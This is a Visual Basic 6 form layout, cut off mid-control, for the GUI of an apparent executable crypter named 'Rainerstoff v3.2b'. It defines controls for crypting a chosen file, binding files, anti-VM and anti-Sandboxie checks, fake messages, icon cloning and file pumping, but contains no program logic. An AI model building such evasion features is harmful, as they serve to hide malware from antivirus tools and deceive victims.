VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Rainerstoff v3.2b"
   ClientHeight    =   6510
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   5160
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6510
   ScaleWidth      =   5160
   StartUpPosition =   1  'CenterOwner
   Begin prjCryptox.jcbutton cmdAbout 
      Height          =   255
      Left            =   -720
      TabIndex        =   61
      Top             =   5040
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   450
      ButtonStyle     =   8
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14737632
      Caption         =   "About"
      ForeColor       =   8421504
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   1
      CaptionAlign    =   2
      TooltipBackColor=   0
      ColorScheme     =   3
   End
   Begin prjCryptox.jcbutton cmdAuthenticate 
      Height          =   255
      Left            =   -720
      TabIndex        =   60
      Top             =   2880
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   450
      ButtonStyle     =   8
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14737632
      Caption         =   "Login"
      ForeColor       =   8421504
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   1
      CaptionAlign    =   2
      TooltipType     =   1
      TooltipIcon     =   1
      TooltipBackColor=   0
      ColorScheme     =   3
   End
   Begin VB.TextBox txtIdioma 
      Height          =   495
      Left            =   120
      TabIndex        =   53
      Top             =   720
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.TextBox txtPump 
      Height          =   495
      Left            =   120
      TabIndex        =   52
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin prjCryptox.jcbutton cmdGeneral 
      Height          =   255
      Left            =   -720
      TabIndex        =   34
      Top             =   3240
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   450
      ButtonStyle     =   8
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14737632
      Caption         =   "General "
      ForeColor       =   8421504
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   1
      CaptionAlign    =   2
      TooltipBackColor=   0
      ColorScheme     =   3
   End
   Begin prjCryptox.jcbutton cmdAnti 
      Height          =   255
      Left            =   -720
      TabIndex        =   33
      Top             =   3600
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   450
      ButtonStyle     =   8
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14737632
      Caption         =   "Anti "
      ForeColor       =   8421504
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   1
      CaptionAlign    =   2
      TooltipType     =   1
      TooltipIcon     =   1
      TooltipBackColor=   0
      ColorScheme     =   3
   End
   Begin prjCryptox.jcbutton cmdFakeMessage 
      Height          =   255
      Left            =   -720
      TabIndex        =   32
      Top             =   3960
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   450
      ButtonStyle     =   8
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14737632
      Caption         =   "Fake Message "
      ForeColor       =   8421504
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   1
      CaptionAlign    =   2
      TooltipBackColor=   0
      ColorScheme     =   3
   End
   Begin prjCryptox.jcbutton cmdReversing 
      Height          =   255
      Left            =   -720
      TabIndex        =   31
      Top             =   4320
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   450
      ButtonStyle     =   8
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14737632
      Caption         =   "Reversing Options"
      ForeColor       =   8421504
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   1
      CaptionAlign    =   2
      TooltipBackColor=   0
      ColorScheme     =   3
   End
   Begin prjCryptox.jcbutton cmdIcon 
      Height          =   255
      Left            =   -720
      TabIndex        =   30
      Top             =   4680
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   450
      ButtonStyle     =   8
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14737632
      Caption         =   "Icon \ Resources"
      ForeColor       =   8421504
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   1
      CaptionAlign    =   2
      TooltipBackColor=   0
      ColorScheme     =   3
   End
   Begin VB.TextBox txtStyle 
      Height          =   495
      Left            =   4320
      TabIndex        =   50
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.TextBox txtBajar 
      Height          =   495
      Left            =   3720
      TabIndex        =   45
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.TextBox txtClone 
      Height          =   495
      Left            =   3120
      TabIndex        =   43
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.TextBox txtKey 
      Height          =   495
      Left            =   720
      TabIndex        =   40
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.TextBox txtBind 
      Height          =   495
      Left            =   1320
      TabIndex        =   39
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.TextBox txtIcon 
      Height          =   495
      Left            =   1920
      TabIndex        =   38
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.TextBox txtRespuesta 
      Height          =   495
      Left            =   2520
      TabIndex        =   37
      Top             =   120
      Visible         =   0   'False
      Width           =   495
   End
   Begin prjCryptox.ucTextbox txtFile 
      Height          =   345
      Left            =   120
      TabIndex        =   1
      ToolTipText     =   "Select the location of the file to be crypted."
      Top             =   1920
      Width           =   4095
      _ExtentX        =   7223
      _ExtentY        =   609
      Caption         =   "File "
      BorderColor     =   8421504
      Text            =   "C:\File.exe"
   End
   Begin prjCryptox.EviProgressBar pG 
      Height          =   255
      Left            =   1440
      TabIndex        =   0
      Top             =   5400
      Visible         =   0   'False
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   450
      Color           =   12632256
      Style           =   5
      Color2          =   8421504
   End
   Begin prjCryptox.jcbutton cmdBrowse 
      Height          =   345
      Left            =   4440
      TabIndex        =   2
      Top             =   1920
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   609
      ButtonStyle     =   3
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14935011
      Caption         =   "..."
      ForeColorHover  =   4210752
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   2
      UseMaskColor    =   0   'False
      TooltipType     =   1
      TooltipIcon     =   1
      TooltipTitle    =   "ef"
      TooltipBackColor=   0
      ColorScheme     =   2
   End
   Begin prjCryptox.jcbutton cmdBuild 
      Height          =   345
      Left            =   4440
      TabIndex        =   3
      Top             =   6000
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   609
      ButtonStyle     =   3
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   14935011
      Caption         =   "Build"
      ForeColorHover  =   4210752
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   2
      UseMaskColor    =   0   'False
      TooltipType     =   1
      TooltipIcon     =   1
      TooltipTitle    =   "ef"
      TooltipBackColor=   0
      ColorScheme     =   2
   End
   Begin prjCryptox.xFrame frmLogin 
      Height          =   2775
      Left            =   1440
      TabIndex        =   56
      Top             =   2520
      Width           =   3615
      _ExtentX        =   5741
      _ExtentY        =   3413
      BackColor       =   15000804
      BorderColor     =   12632256
      ButtonColor     =   8283750
      ButtonHighlightColor=   12298664
      ColorScheme     =   3
      Caption         =   "Login"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   -1  'True
      ForeColor       =   8283750
      FontItalic      =   0   'False
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      GradientBottom  =   15920108
      HeaderGradientBottom=   14606046
      HeaderGradientTop=   16448250
      Begin prjCryptox.wxpText txtUser 
         Height          =   285
         Left            =   240
         TabIndex        =   59
         Top             =   480
         Width           =   3255
         _ExtentX        =   3201
         _ExtentY        =   503
         Text            =   ""
         BorderColor     =   12632256
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         ForeColor       =   8421504
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
      End
      Begin prjCryptox.jcbutton cmdLogin 
         Height          =   345
         Left            =   2520
         TabIndex        =   58
         TabStop         =   0   'False
         Top             =   1320
         Width           =   975
         _ExtentX        =   1085
         _ExtentY        =   609
         ButtonStyle     =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BackColor       =   14935011
         Caption         =   "Login"
         ForeColorHover  =   4210752
         PictureEffectOnOver=   0
         PictureEffectOnDown=   0
         CaptionEffects  =   2
         UseMaskColor    =   0   'False
         TooltipType     =   1
         TooltipIcon     =   1
         TooltipTitle    =   "ef"
         TooltipBackColor=   0
         ColorScheme     =   2
      End
      Begin prjCryptox.wxpText txtPass 
         Height          =   285
         Left            =   240
         TabIndex        =   57
         Top             =   840
         Width           =   3255
         _ExtentX        =   3201
         _ExtentY        =   503
         Text            =   ""
         PasswordChar    =   "*"
         BorderColor     =   12632256
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         ForeColor       =   8421504
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
      End
   End
   Begin prjCryptox.xFrame frmeGeneral 
      Height          =   2775
      Left            =   1440
      TabIndex        =   6
      Top             =   2520
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   4895
      BackColor       =   15000804
      BorderColor     =   12632256
      ButtonColor     =   8283750
      ButtonHighlightColor=   12298664
      ColorScheme     =   3
      Caption         =   "General"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   -1  'True
      ForeColor       =   8283750
      FontItalic      =   0   'False
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      GradientBottom  =   15920108
      HeaderGradientBottom=   14606046
      HeaderGradientTop=   16448250
      Begin prjCryptox.Check chkDownload 
         Height          =   255
         Left            =   1800
         TabIndex        =   44
         Top             =   360
         Visible         =   0   'False
         Width           =   1695
         _ExtentX        =   3201
         _ExtentY        =   661
         Caption         =   "Download File"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Download File"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkValidate 
         Height          =   375
         Left            =   360
         TabIndex        =   41
         Top             =   960
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         Caption         =   "Validate PE"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Validate PE"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkPack 
         Height          =   255
         Left            =   360
         TabIndex        =   17
         Top             =   720
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Compress Output"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Compress Output"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkBind 
         Height          =   375
         Left            =   360
         TabIndex        =   16
         Top             =   360
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   661
         Caption         =   "Bind File"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Bind File"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   $"frmMain.frx":7706D
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00ACACAC&
         Height          =   975
         Left            =   240
         TabIndex        =   18
         Top             =   1800
         Width           =   2655
      End
   End
   Begin prjCryptox.xFrame frmeIcon 
      Height          =   2775
      Left            =   1440
      TabIndex        =   7
      Top             =   2520
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   4895
      BackColor       =   15000804
      BorderColor     =   12632256
      ButtonColor     =   8283750
      ButtonHighlightColor=   12298664
      ColorScheme     =   3
      Caption         =   "Icon"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   -1  'True
      ForeColor       =   8283750
      FontItalic      =   0   'False
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      GradientBottom  =   15920108
      HeaderGradientBottom=   14606046
      HeaderGradientTop=   16448250
      Begin prjCryptox.Check chkClone 
         Height          =   255
         Left            =   240
         TabIndex        =   42
         Top             =   960
         Width           =   1935
         _ExtentX        =   3413
         _ExtentY        =   450
         Caption         =   "Clone File"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Clone File"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkNull 
         Height          =   255
         Left            =   240
         TabIndex        =   35
         Top             =   360
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         Caption         =   "Null PE Info"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Null PE Info"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkIcon 
         Height          =   375
         Left            =   240
         TabIndex        =   11
         Top             =   600
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   661
         Caption         =   "Replace icon"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Replace icon"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.jcbutton cmdSelectIcon 
         Height          =   255
         Left            =   2400
         TabIndex        =   10
         Top             =   1920
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   450
         ButtonStyle     =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BackColor       =   14935011
         Caption         =   "Select"
         ForeColorHover  =   4210752
         PictureEffectOnOver=   0
         PictureEffectOnDown=   0
         CaptionEffects  =   2
         UseMaskColor    =   0   'False
         TooltipType     =   1
         TooltipIcon     =   1
         TooltipTitle    =   "ef"
         TooltipBackColor=   0
         ColorScheme     =   2
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   975
         Left            =   2400
         ScaleHeight     =   945
         ScaleWidth      =   945
         TabIndex        =   9
         Top             =   840
         Width           =   975
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   $"frmMain.frx":770FA
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00ACACAC&
         Height          =   1455
         Left            =   360
         TabIndex        =   12
         Top             =   1320
         Width           =   2055
      End
   End
   Begin prjCryptox.xFrame frmeAntis 
      Height          =   2775
      Left            =   1440
      TabIndex        =   8
      Top             =   2520
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   4895
      BackColor       =   15000804
      BorderColor     =   12632256
      ButtonColor     =   8283750
      ButtonHighlightColor=   12298664
      ColorScheme     =   3
      Caption         =   "Antis"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   -1  'True
      ForeColor       =   8283750
      FontItalic      =   0   'False
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      GradientBottom  =   15920108
      HeaderGradientBottom=   14606046
      HeaderGradientTop=   16448250
      Begin prjCryptox.Check chkBoxie 
         Height          =   255
         Left            =   360
         TabIndex        =   55
         Top             =   1080
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         Caption         =   "Anti Boxie"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Anti Boxie"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkM2 
         Height          =   255
         Left            =   360
         TabIndex        =   54
         Top             =   840
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   450
         Caption         =   "Virtual Machine Method #2"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Virtual Machine Method #2"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkM1 
         Height          =   255
         Left            =   360
         TabIndex        =   14
         Top             =   600
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   450
         Caption         =   "Virtual Machine Method #1"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Virtual Machine Method #1"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin prjCryptox.Check chkUniversal 
         Height          =   255
         Left            =   360
         TabIndex        =   13
         Top             =   360
         Width           =   2175
         _ExtentX        =   3201
         _ExtentY        =   661
         Caption         =   "Universal Anti"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Universal Anti"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin VB.Label lblAnti 
         BackStyle       =   0  'Transparent
         Caption         =   "The executable will not run on the selected Anti."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00ACACAC&
         Height          =   495
         Left            =   360
         TabIndex        =   15
         Top             =   2160
         Width           =   2655
      End
   End
   Begin prjCryptox.xFrame frmeFake 
      Height          =   2775
      Left            =   1440
      TabIndex        =   19
      Top             =   2520
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   4895
      BackColor       =   15000804
      BorderColor     =   12632256
      ButtonColor     =   8283750
      ButtonHighlightColor=   12298664
      ColorScheme     =   3
      Caption         =   "Fake Message"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   -1  'True
      ForeColor       =   8283750
      FontItalic      =   0   'False
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      GradientBottom  =   15920108
      HeaderGradientBottom=   14606046
      HeaderGradientTop=   16448250
      Begin VB.ComboBox cmbStyle 
         Height          =   315
         ItemData        =   "frmMain.frx":77197
         Left            =   960
         List            =   "frmMain.frx":771A7
         TabIndex        =   48
         Text            =   "Please select."
         Top             =   720
         Width           =   2415
      End
      Begin prjCryptox.jcbutton cmdFakeMsgTest 
         Height          =   255
         Left            =   2640
         TabIndex        =   26
         Top             =   2280
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   450
         ButtonStyle     =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BackColor       =   14935011
         Caption         =   "Test"
         ForeColorHover  =   4210752
         PictureEffectOnOver=   0
         PictureEffectOnDown=   0
         CaptionEffects  =   2
         UseMaskColor    =   0   'False
         TooltipType     =   1
         TooltipIcon     =   1
         TooltipTitle    =   "ef"
         TooltipBackColor=   0
         ColorScheme     =   2
      End
      Begin prjCryptox.wxpText txtDescription 
         Height          =   525
         Left            =   960
         TabIndex        =   23
         Top             =   1680
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   926
         Text            =   ""
         BorderColor     =   12632256
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         ForeColor       =   8421504
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjCryptox.wxpText txtTitle 
         Height          =   285
         Left            =   960
         TabIndex        =   22
         Top             =   1200
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   503
         Text            =   ""
         BorderColor     =   12632256
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         ForeColor       =   8421504
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin prjCryptox.Check chkFake 
         Height          =   375
         Left            =   240
         TabIndex        =   20
         Top             =   360
         Width           =   2655
         _ExtentX        =   4683
         _ExtentY        =   661
         Caption         =   "Enable Fake Message"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   8421504
         Caption         =   "Enable Fake Message"
         BackColor       =   15000804
         ForeColor       =   8421504
      End
      Begin VB.Label lblStyle 
         BackStyle       =   0  'Transparent
         Caption         =   "Style"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   49
         Top             =   720
         Width           =   615
      End
      Begin VB.Label lblMsg 
         BackStyle       =   0  'Transparent
         Caption         =   "Message"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   25
         Top             =   1680
         Width           =   615
      End
      Begin VB.Label lblTitle 
         BackStyle       =   0  'Transparent
         Caption         =   "Title"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   240
         TabIndex        =   24
         Top             =   1200
         Width           =   615
      End
      Begin VB.Label lblMessageInfo 
         BackStyle       =   0  'Transparent
         Caption         =   "The following message will be displayed, the EXE is ran."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00ACACAC&
         Height          =   375
         Left            =   240
         TabIndex        =   21
         Top             =   2280
         Width           =   2295
      End
   End
   Begin prjCryptox.xFrame frmeReversing 
      Height          =   2775
      Left            =   1440
      TabIndex        =   27
      Top             =   2520
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   4895
      BackColor       =   15000804
      BorderColor     =   12632256
      ButtonColor     =   8283750
      ButtonHighlightColor=   12298664
      ColorScheme     =   3
      Caption         =   "Reversing Options"
      Enabled         =   -1  'True
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      FontBold        =   -1  'True
      ForeColor       =   8283750
      FontItalic      =   0   'False
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      GradientBottom  =   15920108
      HeaderGradientBottom=   14606046
      HeaderGradientTop=   16448250
      Begin prjCryptox.Check chkPump 
         Height          =   375
         Left            =   360
         TabIndex        =   51
         Top             =   1680
         Width           =   2655
         _ExtentX        =   4683
